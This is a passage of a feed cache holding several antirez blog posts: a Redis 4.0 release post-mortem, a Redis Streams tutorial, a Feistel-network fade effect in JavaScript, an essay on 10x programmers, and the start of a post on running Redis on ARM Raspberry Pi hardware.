<br>So I basically released a 4.0.3 that had all the PSYNC2 fixes minus the most important one for the replication bug. I released ASAP a new patch level version, Redis 4.0.4, including the replication fix. This was already not great: upgrading Redis is a scheduled activity, and nobody wants to upgrade two times because I make errors in preparing the release… But the worst was yet to happen. The fix that I added in 4.0.4, the one about scripts replication in restarting slaves performing PSYNC2, had an error that passed totally unnoticed through all the replication integration tests: the fix involved storing the Lua scripts in the slave memory directly into the RDB, in order to reload them later. However it was not considered that the function loading the scripts, would assert if the script was already in memory, so when a slave received a full synchronization from a master, it started to load the RDB file, crashing immediately because of some duplicated script that was already in memory.  A user reported it ASAP via Twitter, and I fixed the problem in less than 45 minutes, from the reporting moment to the 4.0.5 availability, but this does not mitigate all the potential problems that this sequence of failures at delivering a fix caused.
<br>
<br>The above problems were caused by a number of reasons:
<br>
<br>1. Redis 4.0 was delivered as stable too early, considering the complexity and the amount of code change in PSYNC2. The next time, even at the cost of delaying releases, I’ll wait more and will take the new major versions of Redis more time in the last release candidate, so that we can find such bugs before shipping a GA version.
<br>
<br>2. I rushed too much trying to deliver a fix for issue #4483. Even if the bug was critical, it was better to spend some time in order to check what was happening, and the potential problems caused by the fix itself. Moreover I was so much in a hurry that I did not check the set of commits composing 4.0.3 with enough care, causing the lack of one of the fixes, and the need for a new release.
<br>
<br>3. While Redis 4.0 has very strict PSYNC2 unit and integration tests, including tests that simulate continuous failovers checking data consistency at every step, because of this bug I discovered that the tests never try to mix PSYNC2 with replication of Lua scripts. This must be improved. Also the PSYNC2 replication after slave RDB restart must be enhanced as well.
<br>
<br>I’ll start with the improvements at “3”, and in the future I’ll consider the lessons at “1” and “2” before every new release. My sincere apologize to everybody that had to deal with my errors in this instance, and a big thank you to @soloestoy for an incredible amount of help and support.
<a href=\"http://antirez.com/news/115\">Comments</a>" nil "http://antirez.com/news/115" "12134725aa8528bca17cf18dbbddbf86") (67 (26588 31767 69133 939000) "http://antirez.com/news/114
" "Streams: a new general purpose data structure in Redis. " nil "Mon, 02 Oct 2017 15:12:35 +0000" "Until a few months ago, for me streams were no more than an interesting and relatively straightforward concept in the context of messaging. After Kafka popularized the concept, I mostly investigated their usefulness in the case of Disque, a message queue that is now headed to be translated into a Redis 4.2 module. Later I decided that Disque was all about AP messaging, which is, fault tolerance and guarantees of delivery without much efforts from the client, so I decided that the concept of streams was not a good match in that case.
<br>
<br>However, at the same time, there was a problem in Redis, that was not taking me relaxed about the data structures exported by default. There is some kind of gap between Redis lists, sorted sets, and Pub/Sub capabilities. You can kindly use all these tools in order to model a sequence of messages or events, but with different tradeoffs. Sorted sets are memory hungry, can’t model naturally the same message delivered again and again, clients can’t block for new messages. Because a sorted set is not a sequential data structure, it’s a set where elements can be moved around changing their scores: no wonder if it was not a good match for things like time series. Lists have different problems creating similar applicability issues in certain use cases: you cannot explore what is in the middle of a list because the access time in that case is linear. Moreover no fan-out is possible, blocking operations on list serve a single element to a single client. Nor there was a fixed element identifier in lists, in order to say: given me things starting from that element. For one-to-many workloads there is Pub/Sub, which is great in many cases, but for certain things you do not want fire-and-forget: to retain a history is important, not just to refetch messages after a disconnection, also because certain list of messages, like time series, are very important to explore with range queries: what were my temperature readings in this 10 seconds range?
<br>
<br>The way I tried to address the above problems, was planning a generalization of sorted sets and lists into a unique more flexible data structure, however my design attempts ended almost always in making the resulting data structure ways more artificial than the current ones. One good thing about Redis is that the data structures exported resemble more the natural computer science data structures, than, “this API that Salvatore invented”. So in the end, I stopped my attempts, and said, ok that’s what we can provide so far, maybe I’ll add some history to Pub/Sub, or some more flexibility to lists access patterns in the future. However every time an user approached me during a conference saying “how would you model time series in Redis?” or similar related questions, my face turned green.
<br>
<br>Genesis
<br>=======
<br>
<br>After the introduction of modules in Redis 4.0, users started to see how to fix this problem themselves. One of them, Timothy Downs, wrote me the following over IRC:
<br>
<br>    <forkfork> the module I'm planning on doing is to add a transaction log style data type - meaning that a very large number of subscribers can do something like pub sub without a lot of redis memory growth
<br>    <forkfork> subscribers keeping their position in a message queue rather than having redis maintain where each consumer is up to and duplicating messages per subscriber
<br>
<br>This captured my imagination. I thought about it a few days, and realized that this could be the moment when we could solve all the above problems at once. What I needed was to re-imagine the concept of “log”. It is a basic programming element, everybody is used to it, because it’s just as simple as opening a file in append mode and writing data to it in some format. However Redis data structures must be abstract. They are in memory, and we use RAM not just because we are lazy, but because using a few pointers, we can conceptualize data structures and make them abstract, to allow them to break free from the obvious limits. For instance normally a log has several problems: the offset is not logical, but is an actual bytes offset, what if we want logical offsets that are related to the time an entry was inserted? We have range queries for free. Similarly, a log is often hard to garbage collect: how to remove old elements in an append only data structure? Well, in our idealized log, we just say we want at max this number of entries, and the old ones will go away, and so forth.
<br>
<br>While I was trying to write a specification starting from the seed idea of Timothy, I was working to a radix tree implementation that I was using for Redis Cluster, to optimize certain parts of its internals. This provided the ground in order to implement a very space efficient log, that was still accessible in logarithmic time to get ranges. At the same time I started reading about Kafka streams to get other interesting ideas that could fit well into my design, and this resulted into getting the concept of Kafka consumer groups, and idealizing it again for Redis and the in-memory use case. However the specification remained just a specification for months, at the point that after some time I rewrote it almost from scratch in order to upgrade it with many hints that I accumulated talking with people about this upcoming addition to Redis. I wanted Redis streams to be a very good use case for time series especially, not just for other kind of events and messaging applications.
<br>
<br>Let’s write some code
<br>=====================
<br>
<br>Back from Redis Conf, during the summertime, I was implementing a library called “listpack”.  This library is just the successor of ziplist.c, that is, a data structure that can represent a list of string elements inside a single allocation. It’s just a very specialized serialization format, with the peculiarity of being parsable also in reverse order, from right to left: something needed in order to substitute ziplists in all the use cases.
<br>
<br>Mixing radix trees + listpacks, it is possible to easily build a log that is at the same time very space efficient, and indexed, that means, allowing for random access by IDs and time. Once this was ready, I started to write the code in order to implement the stream data structure. I’m still finishing the implementation, however at this point, inside the Redis “streams” branch at Github, there is enough to start playing and having fun. I don’t claim that the API is 100% final, but there are two interesting facts: one is that at this point, only the consumer groups are missing, plus a number of less important commands to manipulate the stream, but all the big things are implemented already. The second is the decision to backport all the stream work back into the 4.0 branch in about two months, once everything looks stable. It means that Redis users will not have to wait for Redis 4.2 in order to use streams, they will be available ASAP for production usage. This is possible because being a new data structure, almost all the code changes are self-contained into the new code. With the exception of the blocking list operations: the code was refactored so that we share the same code for streams and lists blocking operations, with a great simplification of the Redis internals.
<br>
<br>Tutorial: welcome to Redis Streams
<br>==================================
<br>
<br>In some way, you can think at streams as a supercharged version of Redis lists. Streams elements are not just a single string, they are more objects composed of fields and values. Range queries are possible and fast. Each entry in a stream has an ID, which is a logical offset. Different clients can blocking-wait for elements with IDs greater than a specified one. A fundamental command of Redis streams is XADD. Yes, all the Redis stream commands are prefixed by an “X”.
<br>
<br>> XADD mystream * sensor-id 1234 temperature 10.5
<br>1506871964177.0
<br>
<br>The XADD command will append the specified entry as a new element to the specified stream “mystream”. The entry, in the example above, has two fields: sensor-id and temperature, however each entry in the same stream can have different fields. Using the same field names will just lead to better memory usage. An interesting thing is also that the fields order is guaranteed to be retained. XADD returns the ID of the just inserted entry, because with the asterisk in the third argument, we asked the command to auto-generate the ID. This is almost always what you want, but it is possible also to force a specific ID, for instance in order to replicate the command to slaves and AOF files.
<br>
<br>The ID is composed of two parts: a millisecond time and a sequence number. 1506871964177 is the millisecond time, and is just a Unix time with millisecond resolution. The number after the dot, 0, is the sequence number, and is used in order to distinguish entries added in the same millisecond. Both numbers are 64 bit unsigned integers. This means that we can add all the entries we want in a stream, even in the same millisecond. The millisecond part of the ID is obtained using the maximum between the current local time of the Redis server generating the ID, and the last entry inside the stream. So even if, for instance, the computer clock jumps backward, the IDs will continue to be incremental. In some way you can think stream entry IDs as whole 128 bit numbers. However the fact that they have a correlation with the local time of the instance where they are added, means that we have millisecond precision range queries for free.
<br>
<br>As you can guess, adding two entries in a very fast way, will result in only the sequence number to be incremented. We can simulate the “fast insertion” simply with a MULTI/EXEC block:
<br>
<br>> MULTI
<br>OK
<br>> XADD mystream * foo 10
<br>QUEUED
<br>> XADD mystream * bar 20
<br>QUEUED
<br>> EXEC
<br>1) 1506872463535.0
<br>2) 1506872463535.1
<br>
<br>The above example also shows how we can use different fields for different entries without having to specifying any schema initially. What happens however is that every first message of every block (that usually contains something in the range of 50-150 messages) is used as reference, and successive entries having the same fields are compressed with a single flag saying “same fields of the first entry in this block”. So indeed using the same fields for successive messages saves a lot of memory, even when the set of fields slowly change over time.
<br>
<br>In order to retrieve data from the stream there are two ways: range queries, that are implemented by the XRANGE command, and streaming, implemented by the XREAD command. XRANGE just fetches a range of items from start to stop, inclusive. So for instance I can fetch a single item, if I know its ID, with:
<br>
<br>> XRANGE mystream 1506871964177.0 1506871964177.0
<br>1) 1) 1506871964177.0
<br>   2) 1) \"sensor-id\"
<br>      2) \"1234\"
<br>      3) \"temperature\"
<br>      4) \"10.5\"
<br>
<br>However you can use the special start symbol of “-“ and the special stop symbol of “+” to signify the minimum and maximum ID possible. It’s also possible to use the COUNT option in order to limit the amount of entries returned. A more complex XRANGE example is the following:
<br>
<br>> XRANGE mystream - + COUNT 2
<br>1) 1) 1506871964177.0
<br>   2) 1) \"sensor-id\"
<br>      2) \"1234\"
<br>      3) \"temperature\"
<br>      4) \"10.5\"
<br>2) 1) 1506872463535.0
<br>   2) 1) \"foo\"
<br>      2) \"10\"
<br>
<br>Here we are reasoning in terms of ranges of IDs, however you can use XRANGE in order to get a specific range of elements in a given time range, because you can omit the “sequence” part of the IDs. So what you can do is to just specify times in milliseconds. The following means: “Give me 10 entries starting from the Unix time 1506872463”:
<br>
<br>127.0.0.1:6379> XRANGE mystream 1506872463000 + COUNT 10
<br>1) 1) 1506872463535.0
<br>   2) 1) \"foo\"
<br>      2) \"10\"
<br>2) 1) 1506872463535.1
<br>   2) 1) \"bar\"
<br>      2) \"20\"
<br>
<br>A final important thing to note about XRANGE is that, given that we receive the IDs in the reply, and the immediately successive ID is trivially obtained just incrementing the sequence part of the ID, it is possible to use XRANGE to incrementally iterate the whole stream, receiving for every call the specified number of elements. After the *SCAN family of commands in Redis, that allowed iteration of Redis data structures *despite* the fact they were not designed for being iterated, I avoided to make the same error again.
<br>
<br>Streaming with XREAD: blocking for new data
<br>===========================================
<br>
<br>XRANGE is perfect when we want to access our stream to get ranges by ID or time, or single elements by ID. However in the case of streams that different clients must consume as data arrives, this is not good enough and would require some form of pooling (that could be a good idea for *certain* applications that just connect from time to time to get data).
<br>
<br>The XREAD command is designed in order to read, at the same time, from multiple streams just specifying the ID of the last entry in the stream we got. Moreover we can request to block if no data is available, to be unblocked when data arrives. Similarly to what happens with blocking list operations, but here data is not consumed from the stream, and multiple clients can access the same data at the same time.
<br>
<br>This is a canonical example of XREAD call:
<br>
<br>> XREAD BLOCK 5000 STREAMS mystream otherstream $ $
<br>
<br>And it means: get data from “mystream” and “otherstream”. If no data is available, block the client, with a timeout of 5000 milliseconds. After the STREAMS option we specify the keys we want to listen for, and the last ID we have. However a special ID of “$” means: assume I’ve all the elements that there are in the stream right now, so give me just starting from the next element arriving.
<br>
<br>If, from another client, I send the commnad:
<br>
<br>> XADD otherstream * message “Hi There”
<br>
<br>This is what happens on the XREAD side:
<br>
<br>1) 1) \"otherstream\"
<br>   2) 1) 1) 1506935385635.0
<br>         2) 1) \"message\"
<br>            2) \"Hi There\"
<br>
<br>We get the key that received data, together with the data received. In the next call, we’ll likely use the ID of the last message received:
<br>
<br>> XREAD BLOCK 5000 STREAMS mystream otherstream $ 1506935385635.0
<br>
<br>And so forth. However note that with this usage pattern, it is possible that the client will connect again after a very big delay (because it took time to process messages, or for any other reason). In such a case, in the meantime, a lot of messages could pile up, so it is wise to always use the COUNT option with XREAD, in order to make sure the client will not be flooded with messages and the server will not have to lose too much time just serving tons of messages to a single client.
<br>
<br>Capped streams
<br>==============
<br>
<br>So far so good… however streams at some point have to remove old messages. Fortunately this is possible with the MAXLEN option of the XADD command:
<br>
<br>> XADD mystream MAXLEN 1000000 * field1 value1 field2 value2
<br>
<br>This basically means, if the stream, after adding the new element is found to have more than 1 million messages, remove old messages so that the length returns back to 1 million elements. It’s just like using RPUSH + LTRIM with lists, but this time we have a built-in mechanism to do so. However note that the above means that every time we add a new message, we have also to incur in the work needed in order to remove a message from the other side of the stream. This takes some CPU, so it is possible to use the “~” symbol before the count in MAXLEN, in order to specify that we are not really demanding *exactly* 1 million messages, but if there are a few more it’s not a big problem:
<br>
<br>> XADD mystream MAXLEN ~ 1000000 * foo bar
<br>
<br>This way XADD will remove messages only when it can remove a whole node. This will make having the capped stream almost for free compared to vanilla XADD.
<br>
<br>Consumer groups (work in progress)
<br>==================================
<br>
<br>This is the first of the features that is not already implemented in Redis, but is a work in progress. It is also the idea more clearly inspired by Kafka, even if implemented here in a pretty different way. The gist is that with XREAD, clients can also add a “GROUP <name>” option. Automatically all the clients in the same group will get *different* messages. Of course there could be multiple groups reading from the same stream, in such cases all groups will receive duplicates of the same messages arriving in the stream, but within each group, messages will not be repeated.
<br>
<br>An extension to groups is that it will be possible to specify a “RETRY <milliseconds>” option when groups are specified: in this case, if messages are not acknowledged for processing with XACK, they will be delivered again after the specified amount of milliseconds. This provides some best effort reliability to the delivering of the messages, in case the client has no private means to mark messages as processed. This part is a work in progress as well.
<br>
<br>Memory usage and saving loading times
<br>=====================================
<br>
<br>Because of the design used to model Redis streams, the memory usage is remarkably low. It depends on the number of fields, values, and their lengths, but for simple messages we are at a few millions of messages for every 100 MB of used memory. Moreover, the format is conceived to need very minimal serialization: the listpack blocks that are stored as radix tree nodes, have the same representation on disk and in memory, so they are trivially stored and read. For instance Redis can read 5 million entries from the RDB file in 0.3 seconds.
<br>This makes replication and persistence of streams very efficient.
<br>
<br>It is planned to also allow deletion of items in the middle. This is only partially implemented, but the strategy is to mark entries as deleted in the entry flag, and when a given ratio between entries and deleted entires is reached, the block is rewritten to collect the garbage, and if needed it is glued to another adjacent block in order to avoid fragmentation.
<br>
<br>Conclusions end ETA
<br>===================
<br>
<br>Redis streams will be part of Redis stable in the 4.0 series before the end of the year. I think that this general purpose data structure is going to put a huge patch in order for Redis to cover a lot of use cases that were hard to cover: that means that you had to be creative in order to abuse the current data structures to fix certain problems. One very important use case is time series, but my feeling is that also streaming of messages for other use cases via TREAD is going to be very interesting both as replacement for Pub/Sub applications that need more reliability than fire-and-forget, and for completely new use cases. For now, if you want to start to evaluate the new capabilities in the context of your problems, just fetch the “streams” branch at Github and start playing. After all bug reports are welcome :-)
<br>
<br>If you like videos, a real-time session showing streams is here: https://www.youtube.com/watch?v=ELDzy9lCFHQ
<a href=\"http://antirez.com/news/114\">Comments</a>" nil "http://antirez.com/news/114" "f0b4717c16eef5add9233ce55f18a1bf") (66 (26588 31767 67766 250000) "http://antirez.com/news/113
" "Doing the FizzleFade effect using a Feistel network " nil "Tue, 29 Aug 2017 14:35:14 +0000" "Today I read an interesting article about how the Wolfenstein 3D game implemented a fade effect using a Linear Feedback Shift Register. Every pixel of the screen is set red in a pseudo random way, till all the screen turns red (or other colors depending on the event happening in the game). The blog post describing the implementation is here and is a nice read: http://fabiensanglard.net/fizzlefade/index.php
<br>
<br>You  may wonder why the original code used a LFSR or why I'm proposing a different approach, instead of the vanilla setPixel(rand(),rand()): doing this with a pseudo random generator, as noted in the blog post, is slow, but is also visually very unpleasant, since the more red pixels you have on the screen already, the less likely is that you hit a new yet-not-red pixel, so the final pixels take forever to turn red (I *bet* that many readers of this blog post tried it in the old times of the Spectum, C64, or later with QBASIC or GWBasic). In the final part of the blog post the author writes:
<br>
<br> \"Because the effect works by plotting pixels individually, it was hard to replicate when developers tried to port the game to hardware accelerated GPU. None of the ports managed to replicate the fizzlefade except Wolf4SDL, which found a LFSR taps configuration to reach resolution higher than 320x200.”
<br>
<br>While not rocket science, it was possibly hard for other resolutions to find a suitable LFSR. However regardless of the real complexity of finding an appropriate LFSR for other resolutions, the authors of the port could use another technique, called a Feistel Network, to get exactly the same result in a trivial way.
<br>
<br>What is a Feistel Network?
<br>===
<br>
<br>It’s a building block typically used in cryptography: it creates a transformation between a sequence of bits and another sequence of bits, so that the transformation is always invertible, even if you use all the kind of non linear transformations inside the Feistel network. In practical terms the Feistel network can, for example, translate a 32 bit number A into another 32 bit number B, according to some function F(), so that you can always go from B to A later. Because the function is invertible, it implies that for every input value the Feistel network generates *a different* output value.
<br>
<br>This is a simple Feistel network in pseudo code:
<br>
<br>    Split the input into L and R halves (Example: L = INPUT & 0xFF, R = INPUT >> 8)
<br>    REPEAT for N rounds:
<br>        next_L = R
<br>        R = L XOR F(R)
<br>        L = next_L
<br>    END
<br>    RETURN the value composing L and R again into a single sequence of bits: R<<8 | L
<br>
<br>So we basically split a (for example) 16 bit integer into two 8 bit integers L and R, perform some transformation for N rounds, and recompose them back into a 16 bit integer, which is our output.
<br>
<br>But how is this useful for our problem of implementing FizzleFade? Well you can imagine your 2D screen like a linear array of pixels. If the resolution is 320x200 like in the original game you have from pixel 0 to pixel 63999. So for every integer from 0 to 63999 we can generate a random looking pixel position just by counting and setting the pixel in the position returned by the Feistel network. The problem is that the Feistel network works in bits, so we can’t have exactly from 0 to 63999, we have to pick a power of two which is large enough. The nearest is 16 in this case: with 16 bits we have 65536 integer-to-integer transformations, a few cycles will not be used to set an actual pixel but is not a big waste.
<br>
<br>So, this is how our Feistel network looks like, in Javascript:
<br>
<br>/* Transforms the 16 bit input into another seemingly psenduo random number
<br> * in the same range. Every input 16 bit input will generate a different
<br> * 16 bit output. This is called a Feistel network. */
<br>function feistelNet(input) {
<br>    var l = input & 0xff;
<br>    var r = input >> 8;
<br>    for (var i = 0; i < 8; i++) {
<br>        var nl = r;
<br>        var F = (((r * 11) + (r >> 5) + 7 * 127) ^ r) & 0xff;
<br>        r = l ^ F;
<br>        l = nl;
<br>    }
<br>    return ((r<<8)|l)&0xffff;
<br>}
<br>
<br>The non linear transformation “F” I’m using is just a few random multiplications and shifts, picked mostly at random.
<br>I’m using 8 rounds even if it is probably not needed with a better F function, but I want the effect to look random (coincidentally drawing random pixels is a decent way to visually spot trivial bad distribution properties).
<br>
<br>Implementing this using a Javascript canvas we need a few more functions, to get a 2D context and set a pixel.
<br>
<br>The final code is in this Gist: https://gist.github.com/antirez/6d58860b221a6ae5622ced8ccdddbe47
<br>
<br>You can see the result here: http://antirez.com/misc/fizzlefade.html
<br>
<br>The original problem to explore in this article was to find a way to implement the effect in different resolutions, so even if it is a trivial extension of the 320x200 case, just to make an example, imagine you want to implement the same with 1024*768. There are 786432 pixels, so 2^20 will fit quite well with 1048576 possible integers. We’ll have to modify the Feistel network to have 20 bits input/output by using 10 bits L and R variables, otherwise everything is pretty much the same, but remember to also change the stop condition (that checks the number of frames).
<br>
<br>Actually Feistel networks one-to-one pseudo random mapping properties are very useful in other contexts as well. For instance I used it in my radix tree implementation tests (https://github.com/antirez/rax in case you are curious). A good tool to have in a programmer mental box.
<a href=\"http://antirez.com/news/113\">Comments</a>" nil "http://antirez.com/news/113" "308e9c19eadb9601ec6f1c0bbabfd5df") (65 (26588 31767 67394 308000) "http://antirez.com/news/112
" "The mythical 10x programmer " nil "Tue, 28 Feb 2017 11:08:42 +0000" "A 10x programmer is, in the mythology of programming, a programmer that can do ten times the work of another normal programmer, where for normal programmer we can imagine one good at doing its work, but without the magical abilities of the 10x programmer. Actually to better characterize the “normal programmer” it is better to say that it represents the one having the average programming output, among the programmers that are professionals in this discipline.
<br>
<br>The programming community is extremely polarized about the existence or not of such a beast: who says there is no such a thing as the 10x programmer, who says it actually does not just exist, but there are even 100x programmers if you know where to look for.
<br>
<br>If you see programming as a “linear” discipline, it is clear that the 10x programmer looks like an irrational possibility. How can a runner run 10x faster than another one? Or a construction worker build 10x the things another worker can build in the same time? However programming is a design discipline, in a very special way. Even when a programmer does not participate in the actual architectural design of a program, the act of implementing it still requires a sub-design of the implementation strategy.
<br>
<br>So if the design and implementation of a program are not linear abilities, things like experience, coding abilities, knowledge, recognition of useless parts, are, in my opinion, not just linear advantages, they work together in a multiplicative way in the act of creating a program. Of course this phenomenon happens much more when a programmer can both handle the design and the implementation of a program. The more “goal oriented” is the task, the more a potential 10x programmer can exploit her/his abilities in order to reach the goal with a lot less efforts. When the task at hand is much more rigid, with specific guidelines about what tools to use and how to implement things, the ability of a 10x programmer to perform a lot of work in less time is weakened: it can still exploit “local” design possibilities to do a much better work, but cannot change in more profound ways the path used to reach the goal, that may include, possibly, even eliminating part of the specification completely from the project, so that the goal to be reached looks almost the same but the efforts to reach it are reduced by a big factor.
<br>
<br>In twenty years of working as a programmer I observed other programmers working with me, as coworkers, guided by me in order to reach a given goal, providing patches to Redis and other projects. At the same time many people told me that they believe I’m a very fast programmer. Considering I’m far from being a workaholic, I’ll also use myself as a reference of coding things fast.
<br>
<br>The following is a list of qualities that I believe make the most difference in programmers productivity.
<br>
<br>* Bare programming abilities: getting sub-tasks done
<br>
<br>One of the most obvious limits, or strengths, of a programmer is to deal with the sub-task of actually implementing part of a program: a function, an algorithm or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently in order to implement something is, in my experience, not as widespread as one may think. In a team sometimes I observed very incompetent programmers, that were not even aware of a simple sorting algorithm, to get more work done than graduated programmers that were in theory extremely competent but very poor in the practice of implementing solutions.
<br>
<br>* Experience: pattern matching
<br>
<br>By experience I mean the set of already explored solutions for a number of recurring tasks. An experienced programmer eventually knows how to deal with a variety of sub tasks. This avoids both a lot of design work, but especially, is an extremely powerful weapon against design errors, that are in turn among the biggest enemies of simplicity.
<br>
<br>* Focus: actual time VS hypothetical time
<br>
<br>The number of hours spent writing code is irrelevant without looking at the quality of the time. Lack of focus can be generated by internal and external factors. Internal factors are procrastination, lack of interest in the project at hand (you can’t be good doing things you do not love), lack of exercise / well-being, poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often and so forth. It seems natural that trying to improve focus and to reduce interruptions is going to have a non marginal effect on the programming productivity. Sometimes in order to gain focus, extreme measures are needed. For instance I only read emails from time to time and do not reply to most of them.
<br>
<br>* Design sacrifice: killing 5% to get 90%
<br>
<br>Often complexity is generated when there is no willingness to recognized that a non fundamental goal of a project is accounting for a very large amount of design complexity, or is making another more important goal very hard to reach, because there is a design tension among a fundamental feature and a non fundamental one. It is very important for a designer to recognize all the parts of a design that are not easy wins, that is, there is no proportionality between the effort and the advantages. A project that is executed in order to maximize the output, is going to focus exactly on the aspects that matter and that can be implemented in a reasonable amount of time. For example when designing Disque, a message broker, at some point I realized that by providing just best-effort ordering for the messages, all the other aspects of the project could be substantially improved: availability, query language and clients interaction, simplicity and performances.
<br>
<br>* Simplicity
<br>
<br>This is an obvious point that means all and nothing. In order to understand what simplicity is, it is worth to check how complexity is often generated. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices, and the accumulation of errors in the design activity.
<br>
<br>If you think at the design process, each time a wrong path is pursued, we get more and more far from the optimal solution. An initial design error, in the wrong hands, will not generate a re-design of the same system, but will lead to the design of another complex solution in order to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.
<br>
<br>The way simplicity can be achieved is to reason in terms of small metal “proof of concepts”, so that a large amount of simple designs can be explored in the mind of the programmer, to start working from something that looks the most viable and direct solution. Later, experience and personal design abilities will allow to improve the design and find sensible solutions for the sub-designs that need to be resolved.
<br>
<br>However each time a complex solution is needed, it’s important to reason for a long time about how the complexity can be avoided, and only continue in that direction if no better possibility is found even considering completely different alternatives.
<br>
<br>* Perfectionism, or how to kill your productivity and bias your designs
<br>
<br>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and as a personality trait. In both the instances, I see this as one of the biggest barriers for a programmer to deliver things fast. Perfectionism and fear of external judice insert a designing bias that will result in poor choices in order to refine a design only according to psychological or trivially measurable parameters, where things like robustness, simplicity, ability to deliver in time, are often never accounted for.
<br>
<br>* Knowledge: some theory is going to help
<br>
<br>When dealing with complex tasks, knowledge about data structures, fundamental limits of computation, non trivial algorithms that are very suitable to model certain tasks, are going to have an impact in the ability to find a suitable design. To be a super expert of everything is not required, but to be at least aware of a multitude of potential solutions for a problem certainly is. For instance applying design sacrifice (accept some error percentage) and being aware of probabilistic set cardinality estimators, can be combined together in order to avoid a complex, slow and memory inefficient solution in order to count unique items in a stream.
<br>
<br>* Low level: understanding the machine
<br>
<br>A number of issues in programs, even when using high level languages, arise from the misunderstanding of how the computer is going to perform a given task. This may even lead to the need of re-designing and re-implementing again from scratch a project because there is a fundamental problem in the tools or algorithms used. Good competence of C, the understanding of how CPUs work and clear ideas about how the kernel operates and how system calls are implemented, can save from bad late-stage surprises.
<br>
<br>* Debugging skills
<br>
<br>It is very easy to spend an enormous amount of work in order to find bugs. The sum of being good at gaining state about a bug, incrementally, in order to fix it with a rational set of steps, and the attitude of writing simple code that is unlikely to contain too many bugs, can have a great effect on the programmer efficiency.
<br>
<br>It is no surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined they allow for good implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call “opportunistic programming”. Basically at every development step, the set of features to implement is chosen in order to have the maximum impact on the user base of the program, with the minimum requirement of efforts.
<a href=\"http://antirez.com/news/112\">Comments</a>" nil "http://antirez.com/news/112" "23dadddb5b494d62cc652060bf156ca3") (64 (26588 31767 66804 688000) "http://antirez.com/news/111
" "Redis on the Raspberry Pi: adventures in unaligned lands " nil "Fri, 24 Feb 2017 09:52:30 +0000" "After 10 million of units sold, and practically an endless set of different applications and auxiliary devices, like sensors and displays, I think it’s deserved to say that the Raspberry Pi is not just a success, it also became one of the preferred platforms for programmers to experiment in the embedded space. Probably with things like the Pi zero, it is also becoming the platform in order to create hardware products, without incurring all the risks and costs of designing, building, and writing software for vertical devices.
<br>
<br>Well, I love to think that also Redis is a platform that programmers like to use when to hack, experiment, build new things. Moreover devices that can be used for embedded / IoT applications, often have the problem of temporarily or permanently storing data, for example received by sensors, on the device, to perform on-device computations or to send them to remote servers. Redis is adding a “Stream” data type that is specifically suited for streams of data and time series storage, at this point the specification is near complete and work to implement it will start in the next weeks. Redis existing data structures, and the new streams, together with the small memory footprint, the decent performances it can provide even while running on small hardware (and resulting low energy usage), looked like a good match for Raspberry Pi potential applications, and in general for small ARM devices. The missing piece was the obvious one: to run well on the Pi.
<br>
<br>One of the many cool things about the Pi is that its development environment does not look like the embedded development environments of a few years ago… It just runs Linux, with all the Debian-alike tooling you expect to find. Basically adapting Redis to work on the Pi was not a huge task. The most fundamental mismatch a Linux system program and the Pi could have, is a performance / footprint mismatch, but this a non issue because of the Redis design itself: an empty instance consumes a total of 1MB of Resident Set Size, serves queries from memory, so it is fast enough and does not stress the flash disk too much, and when persistence is needed, it uses AOF which has an append-only write pattern. However the Pi runs an ARM processor, and this requires some care when dealing with unaligned accesses.
<br>
<br>In this blog post, while showing you what I did to make Redis and Raspberry Pi more happy together, I’ll try to provide an overview about dealing with architectures that do not handle unaligned accesses transparently as the x86 platform does.
<br>
<br>A few things about ARM processors
<br>—
<br>
<br>The most interesting thing about porting Redis to ARM is that ARM processors are, or actually were… well, not big fans of unaligned memory accesses. If you live your life in high level programming, you may not know it, but many processor architectures were historically not able to load or store memory words in addresses not multiple of the word size. So if the word size is 4 bytes (in the case of a 32 bit processor), you may load or store a word at address 0x4, 0x8, and so forth, but not at address 0x7. The result is an exception sometimes, or an odd behavior some other time, depending on the CPU and its exact configuration.
<br>
<br>Then the x86 processors family ruled the world and everybody kinda forgot about this issue (if not for dealing with SEE instructions and alike, but now even those instructions have unaligned variants). Oh well, initially forgetting about the issue is not really what happened. Even if x86 processors could deal with unaligned accesses without raising an exception, doing so was a non trivial performance penalty: partial reads/writes at word boundary required to do the double of the work. But then recent x86 processors have optimizations that make unaligned accesses as fast as aligned accesses most of the times, so basically nowadays for x86 this is really Not An Issue.
<br>
<br>ARM was, up to ARM v5, one of that platforms where unaligned accesses caused strange results, and very unexpected ones, actually. From the ARM official documentation: “if the address is not a multiple of four, the LDR instruction returns a rotated result rather than performing a true unaligned word load. Generally, this rotation is not what the programmer expects.” Oh well *definitely* not what the programmer expects. However even the original Raspberry Pi had an ARM v6 processor. The v6, while incurring into performance penalty, is able to deal with word-sized unaligned accesses. However instructions that deal with multiple words will raise an exception, terminating the program with a signal bus, or asking for help by the kernel (as we’ll see later in more details). This means that Redis would not crash like crap immediately when running on the Pi, because most of the unaligned accesses performed by Redis were actually word-sized. However, from time to time, the compiler generated code to speedup the computation using multiple load/store instructions, or the Redis code itself tried to load/store 64 bit values from unaligned accesses. This normally would result into a crash, in theory, however Linux helps a bit in this regard.
<br>
<br>Instead of crashing, ask the kernel!
<br>—
<br>
<br>The Linux kernel, when running on an ARM processor, is able to help user processes to work as expected even when they execute operations on unaligned addresses that are normally not supported by the CPU. The way this is performed is by registering an handler inside the kernel for such exceptions: the kernel will check the operation that failed, and will simulate it in a function, so that the final result is like if the processor executed it, and then will resume the “offending” process that will continue to run.
<br>
<br>If you are into low level programming, this Linux kernel file is worth checking: http://lxr.free-electrons.com/source/arch/arm/mm/alignment.c
<br>
<br>The actual behavior of the kernel when an unaligned access exception is raised by the CPU, is controlled by the file /proc/cpu/alignment:
<br>
<br>$ cat /proc/cpu/alignment
<br>User:		0
<br>System:		12590 (ip6_datagram_recv_common_ctl+0xc8/0xd4 [ipv6])
<br>Skipped:	0
<br>Half:		0
<br>Word:		0
<br>DWord:		0
<br>Multi:		12590
<br>User faults:	2 (fixup)
<br>
